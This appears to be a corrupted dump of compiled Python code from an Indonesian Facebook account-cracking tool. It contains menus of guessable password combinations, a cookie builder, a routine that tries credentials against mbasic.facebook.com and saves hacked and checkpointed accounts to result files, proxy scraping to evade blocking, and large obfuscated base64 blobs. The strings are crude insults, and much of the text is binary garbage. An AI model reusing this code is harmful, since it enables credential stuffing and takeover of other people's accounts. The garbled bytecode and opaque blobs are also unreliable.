zcrack_new.pilih_nextc                 C   sF   d}|dv r
da d S |dv rda d S tdtt� t�d� | ��  d S )Nr�   r�   rp  r�   rj  z/# KONCOL TINGGAL PILIH 1-2 ITU AJA SUSAH, AnJIMrE   )r~  r9   r�   rO   rP   rQ   r}  )rj   r*  r7   r7   r8   r}  �  s   
zcrack_new.pilih_fpsc              
   C   �   t tt� dt� ��� td�}|dv r$tdtt� t�	d�| �
� f d S |dv r,dad S |dv r4d	ad S t� d
t� dt� |� t� dt� d�
}t t|td�� t�	d�| �� f d S )Nz"Apakah Anda Ingin Menggunkan Proxy�
>--Y/n--> �r1   rr  rD   ru   ��yr�  r�  ��nr�  �PEPEKr�   rs   r�   r�   r2   )rv   r   ry   rx   rM   r9   rN   rO   rP   rQ   r  r�  rw   r�  �rj   Zkpr�   r7   r7   r8   r�  �  �   $zcrack_new.tanya_prox_kc              
   C   r  )Nz,Apakah Anda Ingin Menampilkan Opsi Sesi Akunr  r  rD   ru   r  r�  r  r  r�   rs   r�   r�   r2   )rv   r   ry   rx   rM   r9   rN   rO   rP   rQ   r  r�  rw   r�  r  r7   r7   r8   r�    r  zcrack_new.tanya_opsic              
   C   s�   t tt� dt� dt� dt� d�tdd�� td�}|dv r.td	tt� t	�
d
�| �� f d S |dv r6dad S |dv r>dad S t� dt� dt� |� t� dt� d�
}t t|td�� t	�
d
�| �� f d S )Nz&Apakah Anda Ingin Menampilkan Aplikasir�   zTidak Recommendedr  zPEPEK ENGGA DIBACArR  r  r  rD   ru   r  r�  r  r  r�   rs   r�   r�   r2   )rv   r   ry   rx   r�   rO   rM   r9   rN   rP   rQ   r  r�  rw   r  r7   r7   r8   r  !  s   *$zcrack_new.tanya_apkc              
   C   s8  t tt� dt� �tdd�� t� }|jdtdd� |jdtddd	� |�	d
d� t
� j|dd� td�}|dv rItdtt� t�d�| �� f d S |dv rQdad S |dv rYdad S |dv radad S |dv ridad S |dv r�datdtt� tdt� dt� d��}|dkr�td tt� t�d�| �� f d S t|�d!kr�td"tt� t�d�| �� f d S |}d S |d#v r�d$atdtt� tdt� dt� d��}|dkr�td tt� t�d�| �� f d S t|�d!kr�td"tt� t�d�| �� f d S |}d S t� d%t� d&t� |� t� d't� d(�
}t t|td)�� t�d�| �� f d S )*Nz'Silahkan Pilih Kombinasi Password CrackzBACA DULU KONTOLrR  r�   r�   r�   r�   r�   r�   z1
2
3
4
5
6z�name123,name12345
name,name123,name1234,name12345
name,name123,name12345,sayang,anjing,kontol
name,name123,name12345 + 6 Password
name,name123,name1234,name12345 + MANUAL
MANUALr�   r  )rr  r1   rD   ru   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   zH# GUNAKAN , (koma) Untuk Pemisah Password Dan Minimal Pass 6 Huruf/Angkar  �Passwordr  r1   z# JANGAN KOSONG, KONTOL BIGr<  z1# MINIMAL PASSWORD HARUS LEBIH DARI 5 HURUF/ANGKAr�   r�   r�   rs   r�   r�   r2   )rv   r   ry   rx   rO   r�   r�   rW   r�   r�   r5   r   rM   r9   rN   rP   rQ   r�  r�  r  r�   r�   rS   rw   )rj   r6   ZkolZpwxr�  r�   r7   r7   r8   r�  1  sV   $zcrack_new.pas_meN)rl   rm   rn   rk   ro  r$  r�  r�  r�  r�  r�  r  r  r}  r�  r�  r  r�  r7   r7   r7   r8   r#  �  s$     17 :(r#  c                 C   sF   zd| d | d | d | d | d f }W t |�S    | }Y t |�S )Nz#sb=%s;datr=%s;c_user=%s;xs=%s;fr=%sZsbZdatrr�  Zxs�fr)r�   )re   �cokr7   r7   r8   r�  d  s   (�r�  c              
   C   s�  d|i}t dddd�}|jdt� dt� �dd�}|�t� d	t� ��}|�d
t� | � t� dt� |� t� �� |�t� dt� ��}|�t� |� t� �� zt d
t� dt� d��}d}t|||� W n tyu }	 z
t	|	� W Y d }	~	nd }	~	ww zt d
t� dt� d��}
d}t
||
|� W n ty� }	 z
t	|	� W Y d }	~	nd }	~	ww |�|� |�|
� d}t|dddd�}|�t� dt� ��}|�t|�� t|� d S )Nre   z               Tr�   r�  r�  zuu greenr�   r�  r�   rK   r�  zAplikasi Aktif�:z<https://mbasic.facebook.com/settings/apps/tabbed/?tab=activezAplikasi Tidak Aktifz>https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactivez]Wans X Gans
Jeck X Nano
Xenzi Ganz
Radhin Al Haady
Zee K World
Moch Aang Ardiansyah XD.
Riskyr�   r�   r�   z
Thanks To:)r	   r�   r�  r�   r�   r�   r�   �
get_activer�   r   �get_inactiver   r   r�   )r^   r_   r  re   r�  r�  r�  �activer  r�   �inactiver�   r�   r�  r7   r7   r8   r\   j  s<   &����

r\   c              	   C   �   z@t tj| |d�jd�}|�d�D ]}d|jv r,|�dt� t|j��dd�� t	� �� qqd|j
dd	d
�d  }t|||� W d S    Y d S )Nr�   r�   �h3ZDitambahkanr�   z Ditambahkanrm  r�   �Lihat Lainnyar�   r�   )r�  �sesr�   r�   rn  r�   r�   r�   rY   r�   r   r!  )r  r#  re   r:   �apkr�  r7   r7   r8   r!  �  �   
(r!  c              	   C   r%  )Nr�   r�   r&  ZKedaluwarsar�   z Kedaluwarsarm  r�   r'  r�   r�   )r�  r(  r�   r�   rn  r�   ry  r�   rY   r�   r   r"  )r  r$  re   r:   r)  r�  r7   r7   r8   r"  �  r*  r"  c                 C   s�   zGt jd| d�}t|jd�}|�dddi�D ].}dt|�v rDt�dt|j���d	�t�d
t|j���d	�dd�}t j	d|d  || d�}qW d S    Y d S )Nz%https://mbasic.facebook.com/language/r�   r�   r]   r�  r
  zBahasa Indonesiazname="fb_dtsg" value="(.*?)"r�   r�  )�fb_dtsgr�  r[   rm  �action)r:   r�   )
r(  r�   r�  r�   rn  r�   r�  r�  r�  r
  )re   r  r:   rA   ZbahasaZeksekusir7   r7   r8   r�  �  s   4��r�  c                 C   s&  t �| �}d\}}|D ]p}| d | }zt|d��� }dtt|�� }W n   d}Y z#|�d�d }tt d | }	||	t d t t	 | t d	 7 }W n   Y z#|�d
�d }
tt
 d
 |
 }||t d t t	 | t d	 7 }W q   Y qtt|tdd�� tt|tdd�� t�  d S rM  rS  )r>   rU  rV  rW  rX  rY  rZ  r[  r\  r]  r^  r_  r7   r7   r8   rL   �  r`  rL   c                 C   s�   t dddd�}|jddd�}|�t� dt� dt� d	t� ��}|�t� | � t� d
t� |� t� d
t� |� t� �� |�d�}t| |||� t|� d S )Nr�   Tr�   z:bolivia::oman:r�  r�   ZIdz Dan r  rK   ZOption)r	   r�   r�   r�   r�  �check_opr�   )r^   ZpeZtltr�  r�  r�  �opsir7   r7   r8   r�  �  s    2
r�  c                 C   s�  �z�d}d}t �� }|j�ddd|d|ddd	d
dd|d ddd�� i }t|j|d d|id�jd�}|�dddi�}	g d�}
|	�d�D ]}|�d�|
v r[|�|�d�|�d�i� qDqD|�| |d�� zt|j	||	�d� |dd�jd�}W n t j
jy�   |�t� dt� �� Y nw d |jv r�|�t� d!t� �� td"t d# d$��| d% | d& � W d S d'|jv �r�|�d�}|�ddd(i�d }|�ddd)i�d }|�ddd*i�d }||||d+d,|d-�}t|j	||d  |d.�jd�}d/d0� |�d1�D �}tt|��d2k�r0|�t� d3t� d4t� d5t� d6�� td7t d# d$��| d% | d% | d& � W d S d8ttt|��f }|�d9t� d:|� d;t� ��}tt|��D ]}t|d< �}|�t� |� t� d=t� || � t� �� �qNtd>t d# d$��| d% | d% | d& � W d S d?t|�v �r�|�d@dAd?i��d@�j}|�t� |� t� �� W d S |�d9t� dBt� �� W d S  t�y� } z'|�t� dCt� �� td>t d# d$��| d% | d% | d& � W Y d }~d S d }~ww )DNrm  z�Mozilla/5.0 (Linux; Android 11; vivo 1904 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36rz  r�  r�   r�  z|text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9zmark.via.gpr�  r�  r�  r�  z/login/?next&ref=dbl&fl&refid=8r�  z#id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7)r�  zcache-controlzupgrade-insecure-requestsr�   r�  r�  r�  r�  r�  r�  zsec-fetch-userr�  r�  r�  r�  r�  r�  r�   r]   r�  r
  )r�  r�  Zm_tsr�  Z
try_numberZunrecognized_triesr�   Zbi_xrwhrM   r�   r�  )r%  r�  r,  T)r:   Zallow_redirectszAkun Ini Terkenak Spamr�  u$   Akun Ini Tidak CheckPointint😱😱rP  rb  r�   rK   rJ   r�  r+  r�  �nhr1   Z	Lanjutkan)r+  r+  r�  r�  Zcheckpoint_datazsubmit[Continue]r/  r  c                 S   s   g | ]}|j �qS r7   )r�   )r�  Zyyr7   r7   r8   �
<listcomp>  s    zcheck_op.<locals>.<listcomp>ZoptionrB  u   SELAMAT AKUN INI TAP YES 😎 r�   zLogin Difb Lite/Mbasicr  zresults/TAP-z%s%sr�   zJumlah Opsi rr  r�   z. rQ  Zlogin_errorZdivr�   zPassword Akun Ini Sudah DiGantiz.Ups.. Sepertinya Akun Ini Tidak Bisa DiCheck!!)r�   r�   r�  r�  r�   r�   r�   r   rn  r
  �
exceptionsZTooManyRedirectsr�   ry  r�   r�   r�   rT   rd  r�   r�   rS   r�   r�   r  r�   )ZuserrzZpwzr�  r.  �hostr�  r(  r:   ZgedZfm�listr�   �runr]   ZdtsgZjzstr/  ZdataDZxnxxZngewZjmlZopsi_�optZjoZohr�   r7   r7   r8   r-  �  s�   �&�
*
�	"2,2:��r-  c               	   C   s�   d} dg}t dd� |D ]A}z)t�|�j�� }t dd��|� t dd��� }|D ]}|�dd�}t�	|� q(W q tj
jyM   td	tt� tj��  Y qw d S )
NZ100000zwhttps://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=100000&country=all&ssl=all&anonymity=allr�  r   r�   rF   rJ   r1   �*# UPS... SEPERTINYA JARINGAN ANDA TERPUTUS)rT   r�   r�   r�   �stripr�   rU   rY   �prox_r  r1  r   r9   rN   r�   r<   r�   rR   )Z	max_proxyZkontol_proxZ	name_proxZproxzrX  Zcrotr7   r7   r8   �get_proxy_socks5'  s"   
���r9  c                  C   sR   zt �d�j} tdd��| � W d S  t jjy(   tdtt	� t
j��  Y d S w )Nzwhttps://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=allzdata/prox_socks4.txtr   r6  )r�   r�   r�   rT   r�   r1  r   r9   rN   r�   r<   r�   rR   )Zproxfr7   r7   r8   �get_proxy_socks47  s   �r:  c              
   C   r{   r|   r�   r�   r7   r7   r8   r�   C  r�   r�   s�  QkL73eh+89/O5fz33ePwui32ty3ffd/2ve8zw/vw/hHf0Mf993rfIuhA953HvQNCbSs6T2sgXUPnHk1biETDYFN5x0LNv2y76VmohPSruj+uskLaWXV2o3qg6o7+QGxKlhpaMWNKCqgO+LvWdQWZzY9XGVnGCHN+aFvF0qOwXnRGi/BK1GHLp0lt6n6W2hV28QgGAh5K6k1jjEckZQ0dcXu/XlokObS9h5WpudVtPsSM0xDWWuG7rvBGnsH9TBh4icAKIpVcS1hQKVvQHNgJ3SyPIYp4Nu598cGRYJjVO71r4RZCv77J8kqglAiT3vczVqhzTPRseMd3tM4lW5lbT9qMWzytHLABFrTC3CNvuoWuydPxEKenRL09m+OUswRkUYDXUnpriYusMoipLCKlHMTlCaLveLONLAsDp7Mu2rHnOCBugRP5lgSBtyeF7tYoM12YLnEKKvXKG6BO0ZXG6JuR1ewSf2Yss8VVn/jaWYvJo6FideblRCZIBaeH1mtzzTPX4wTl8vFuEPIE4lrP4aQZQb7PkdydVezh+Bg6Dji37QZLkLmjXXaY2Sgpcf7PwytDGd+YHQ5JOBI0/bA0FiaStomLp1p6/NnPwiLpWwPAZqvMhawOaI4kcGcPPpjpyO5ofOnfipSyTUqlMBtFk9SBiYLgovoMT7x712IJllsMqhYQx9R9Cy3VB3vwBKu5KqgXHEhS/GRPMWjtOjC8R0PyX75MYu0NCJQ6ryBpWU05XyNGyETyVwdPozz0nFjtjeCXJ/+9FhjIlizOZ96L3hxtP/Gha/whd0KUEH1RyL74Z/mhAwuF9d72TrOU0qC4P1UrniVZ8OQKCQTVTLIdRPmzGFSaKpP4RqrAJjBGQYwuHFnpl2yC8eHQgfUlMMPM7O7zuI2BehodVpL1OiglG6eTtKtntQ3EGWPnbbNkphSUoSzdVCit31xY4qNMZ11HqW4Eoc/nPb5D1Ilq420ZX7nsv2Zj7DdGjfYJnk2SKuRlQF9WPqEZWS9u00whCSbZjdgviHv3Eh3CVQEqtpKfUD74UuBaevnITOPanl0xFF/CbS4KE6HZQHEopOa2/sjMs1iOuOrkK7jms37TvI7lpcEnzbtPrHpNfT2uUFuSRF7lsmV9NppyW0vpqSwjcH1E0anQLsb9kcw7E9zdqycWQGb3ClbX0w9pgCkrAq3eMOJzQGmHftWZtNIyIaYSPm4yqx8gucfhGebW9KiasviMJxuCucptQ1wmipBlhYbyXVdnqCLKq00DDjrkXYBXJXTBAuoyEIfHFqOv1Zaa6ypEXniSFKGvLDnupNHDGIoVu+9bn60nfP+DXONzfrod2H/+41vPtAuTB89nPe3z77rPfqPdu9+WVs/M96yTKH+zVmUXaUHaZ48RhfQjQQGQkHEJGL5MQICBK0QD15SFkkPhAY22yeDldxJec              
   C   r{   r|   r�   r�   r7   r7   r8   r�   F  r�   s   ==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              
